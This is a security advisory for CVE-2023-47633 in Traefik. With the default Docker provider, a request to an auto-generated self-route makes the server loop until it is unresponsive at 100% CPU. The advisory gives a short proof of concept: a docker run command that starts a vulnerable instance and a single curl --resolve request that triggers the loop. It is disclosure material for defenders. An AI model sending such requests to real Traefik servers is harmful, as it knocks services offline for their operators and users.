# Traefik docker container using 100% CPU

**GHSA**: GHSA-6fwg-jrfw-ff7p | **CVE**: CVE-2023-47633 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-400, CWE-770

**Affected Packages**:
- **github.com/traefik/traefik/v2** (go): < 2.10.6
- **github.com/traefik/traefik/v3** (go): < 3.0.0-beta5

## Description

### Summary

The traefik docker container uses 100% CPU when it serves as its own backend, which is an automatically generated route resulting from the Docker integration in the default configuration.

### Details

While attempting to set up Traefik to handle traffic for Docker containers, I observed in the webUI a rule with the following information:

`Host(traefik-service) | webwebsecure | traefik-service@docker | traefik-service`

I assumed that this is something internal; however, I wondered why it would have a host rule on the web entrypoint configured.

So I have send a request with that hostname with `curl -v --resolve "traefik-service:80:xxx.xxx.xxx.xxx" http://traefik-service`. That made my whole server unresponsive.

I assume the name comes from a docker container with that name, traefik itself:
```
localhost ~ # docker ps
CONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES
d1414e74aec7   traefik:v2.10                                           "/entrypoint.sh trae…"   4 minutes ago       Up 4 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:443->443/tcp, :::443->443/tcp, 127.0.0.1:8080->8080/tcp   traefik.service
```

### PoC

1. Start traefik with `docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -p 80:80 --name foo -p 8080:8080 traefik:v2.10 --api.insecure=true --providers.docker`

2. `curl -v --resolve "foo:80:127.0.0.1" http://foo`

looks like this creates an endless loop of request.

Knowing the name of the docker container seems to be enough to trigger this, if the docker backend is used.

### Impact

Server is unreachable and uses 100% CPU
